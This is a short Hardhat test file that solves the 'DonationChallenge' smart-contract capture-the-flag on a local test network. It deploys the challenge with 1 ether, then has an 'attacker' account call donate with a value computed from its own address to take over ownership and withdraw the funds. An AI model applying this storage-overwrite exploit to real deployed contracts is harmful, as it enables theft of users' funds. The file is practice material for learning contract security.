import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { BigNumber, Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

describe('DonationChallenge', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('DonationChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = await target.connect(attacker);
  });

  it('exploit', async () => {
    await target.donate(attacker.address, {
      value: BigNumber.from(attacker.address).div(BigNumber.from(10).pow(36))
    })

    await target.withdraw()

    expect(await target.isComplete()).to.equal(true);
  });
});
